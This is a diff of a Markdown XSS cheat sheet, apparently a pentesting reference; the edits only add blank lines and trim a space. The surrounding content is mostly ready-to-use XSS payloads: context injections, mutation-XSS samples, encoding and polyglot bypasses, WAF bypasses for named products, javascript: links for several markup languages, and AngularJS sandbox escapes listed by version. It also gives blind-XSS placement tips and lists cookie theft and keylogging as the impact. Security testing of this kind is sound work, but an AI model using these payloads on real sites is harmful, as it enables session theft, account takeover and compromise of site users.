@@ -8,7 +8,7 @@ Always identify the injection context before trying payloads.
 |---------|---------|-----------------|
 | HTML body | `<div>INJ</div>` | `<script>alert(1)</script>`, `<svg onload=...>` |
 | HTML attribute (quoted) | `<input value="INJ">` | `" onfocus=alert(1) autofocus x="` |
-| HTML attribute (unquoted) | `<input value=INJ>` | ` onfocus=alert(1) autofocus` |
+| HTML attribute (unquoted) | `<input value=INJ>` | `onfocus=alert(1) autofocus` |
 | JS string | `var x = "INJ"` | `";alert(1);//` |
 | JS template literal | `` `INJ` `` | `${alert(1)}` |
 | CSS | `style="color:INJ"` | `red;background:url(javascript:...)` |
@@ -28,6 +28,7 @@ cat urls.txt | qsreplace '"><script>alert(1)</script>' | kxss
 ## DOM XSS
 
 Sinks in JS (client-side):
+
 - `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`.
 - `eval`, `setTimeout(str)`, `setInterval(str)`, `Function(str)`.
 - `location`, `location.href`, `location.hash` → if re-written.
@@ -43,6 +44,7 @@ Tooling: DOM Invader (Burp), Chrome DevTools breakpoints on DOM modifications.
 Browser parser rewrites HTML after sanitizer runs. Sanitizers like DOMPurify have had mXSS bugs where templating re-introduces script.
 
 Classic payload:
+
 ```
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 <form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
@@ -93,6 +95,7 @@ Always test cross-origin postMessage handlers.
 ```
 
 Encoding tricks:
+
 ```
 <svg/onload=&#x61;lert(1)>
 <svg/onload=alert&NewLine;(1)>
@@ -101,16 +104,19 @@ Encoding tricks:
 ```
 
 Unicode bypass:
+
 ```
 †‡•＜img src=a onerror=javascript:alert('test')>…‰€
 ```
 
 URL context bypass (works without `&#x09;` too):
+
 ```
 javas&#x09;cript://www.google.com/%0Aalert(1)
 ```
 
 XSS Polyglot:
+
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
@@ -127,6 +133,7 @@ Store payload; fires in admin/back-office contexts.
 ```
 
 Self-host [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express) (mandatoryprogrammer) — original xsshunter.com shut down in 2023. Place payloads in:
+
 - User profile fields, addresses, company names.
 - Invoice notes, support ticket subjects.
 - Referrer headers (logged in admin dashboards).
@@ -135,6 +142,7 @@ Self-host [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-e
 ## Impact beyond alert(1)
 
 Don't stop at alert — demonstrate real impact:
+
 - Cookie theft (if not `HttpOnly`).
 - Session rebinding / account takeover via CSRF token theft.
 - Keylogging on sensitive pages (payment, settings).
@@ -145,16 +153,19 @@ Use an exfil endpoint you control for PoC; don't mass-collect real user data.
 ## WAF-specific bypasses
 
 **Kona WAF (Akamai)**
+
 ```
 \');confirm(1);//
 ```
 
 **ModSecurity** — repeat onerror to confuse parser:
+
 ```html
 <img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
 ```
 
 **Wordfence**
+
 ```html
 <meter onmouseover="alert(1)"
 '">><div><meter onmouseover="alert(1)"</div>"
@@ -162,6 +173,7 @@ Use an exfil endpoint you control for PoC; don't mass-collect real user data.
 ```
 
 **Incapsula**
+
 ```html
 <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
 <img/src=q onerror='new Function`al\ert\`1\``'>
@@ -170,6 +182,7 @@ Use an exfil endpoint you control for PoC; don't mass-collect real user data.
 ## Markdown / markup XSS
 
 Works in Markdown renderers that don't strip `javascript:` hrefs:
+
 ```md
 [a](javascript:confirm(1))
 [a](javascript://www.google.com%0Aprompt(1))
@@ -179,16 +192,19 @@ Works in Markdown renderers that don't strip `javascript:` hrefs:
 ```
 
 RubyDoc (.rdoc):
+
 ```rdoc
 XSS[JavaScript:alert(1)]
 ```
 
 Textile:
+
 ```textile
 "Test link":javascript:alert(1)
 ```
 
 reStructuredText:
+
 ```rst
 `Test link`__.
 
@@ -200,56 +216,67 @@ __ javascript:alert(document.domain)
 Check `angular.version` in the browser console to confirm version.
 
 **1.0.1 – 1.1.5**
+
 ```js
 {{constructor.constructor('alert(1)')()}}
 ```
 
 **1.2.0 – 1.2.1**
+
 ```js
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 ```
 
 **1.2.6 – 1.2.18**
+
 ```js
 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
 ```
 
 **1.2.19 – 1.2.23**
+
 ```js
 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
 ```
 
 **1.2.24 – 1.2.29**
+
 ```js
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 ```
 
 **1.3.1 – 1.3.2**
+
 ```js
 {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)//');}}
 ```
 
 **1.3.3 – 1.3.18**
+
 ```js
 {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
 ```
 
 **1.3.20**
+
 ```js
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
 ```
 
 **1.4.0 – 1.4.9**
+
 ```js
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
 ```
 
 **1.5.0 – 1.5.8**
+
 ```js
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
 ```
 
 **1.6.0+ (no sandbox)**
+
 ```js
 {{constructor.constructor('alert(1)')()}}
 ```
